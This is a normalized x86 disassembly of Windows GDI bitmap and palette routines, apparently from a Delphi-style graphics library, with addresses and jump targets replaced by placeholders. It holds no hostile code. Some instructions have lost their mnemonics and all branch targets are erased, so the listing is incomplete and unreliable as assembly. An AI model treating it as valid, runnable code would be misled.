push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_428b44
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_429418
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4267f8
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428970
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_429480
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_429c7c
mov eax [ esi + 0x28 ]
call sub_428974
mov eax [ esi + 0x2c ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4294bc
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_429574
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b34
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_429f4c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_428970
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428974
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418d14
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4295ac
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429c7c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42963b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_4291a8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_428b44
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429640
mov eax [ ebp - 0x8 ]
call sub_4234dc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_40391c
call sub_403970
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42966c
push ebx
mov ebx eax
mov eax ebx
call sub_429960
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d31c
pop ebx
retn
sub_42969c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41ae6c
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_429c7c
lea eax [ ebx + 0x2c ]
call sub_40d31c
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429f4c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_429710
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425354
mov eax ebx
call sub_429d8c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_429a9c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42994c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
call SetStretchBltMode
mov eax ebx
call sub_4299e0
mov dl [ r-xdata ]
call sub_425354
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_429d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4299e0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429953
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4298e1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4299e0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42581c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_429960
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_429c8c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4295ac
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4255d0
sub_4299e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_429c8c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42877c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42966c
sub_429a28
push ebx
mov ebx eax
mov eax ebx
call sub_429c7c
mov eax ebx
call sub_429c8c
mov edx ebx
mov eax ebx
call sub_42966c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_429a4c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_429acc
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_429a4c
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_429b50
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_42966c
mov eax [ ebx + 0x28 ]
add eax 0x18
mov ebp eax
lea esi [ eax + 0x18 ]
test edi edi
jl r-xdata
mov eax [ rw-data ]
call sub_425528
cmp edi [ ebp + 0x8 ]
jl r-xdata
movzx edx [ esi + 0xe ]
mov ecx 0x20
mov eax [ esi + 0x4 ]
call sub_425808
imul edi
add eax [ ebp + 0x14 ]
mov ebx eax
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub eax edi
dec eax
mov edi eax
mov eax ebx
call sub_429c08
call GdiFlush
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
sub_429bb8
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423dac
mov eax ebx
call sub_429a9c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4299e0
xor edx edx
pop ecx
call sub_4251e8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_429c08
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_429d8c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_428b44
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_429c8c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41ae08
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_429d0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_429d2c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_429c7c
mov eax ebx
call sub_429c8c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_429bb8
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_42920c
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_428700
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_429d8c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425d68
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_428700
push 0x0
call GetDC
call sub_425678
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_429e44
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_425540
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4295ac
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_429c7c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b34
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_429ec8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41ade8
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42a5dc
pop esi
pop ebx
retn
sub_429eec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_41b6dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429f40
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429f47
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_429f4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429fd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42a033
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428974
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_428970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a03a
push rw-data
call LeaveCriticalSection
retn
sub_42a04c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42a5dc
pop edx
pop edi
pop esi
pop ebx
retn
sub_42a074
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_42a591
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_42a564
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b34
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_425558
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41b084
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b34
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41b014
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_4257e8
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_425808
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41b014
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_425678
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42a4df
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425ab0
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42a447
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b014
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425678
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
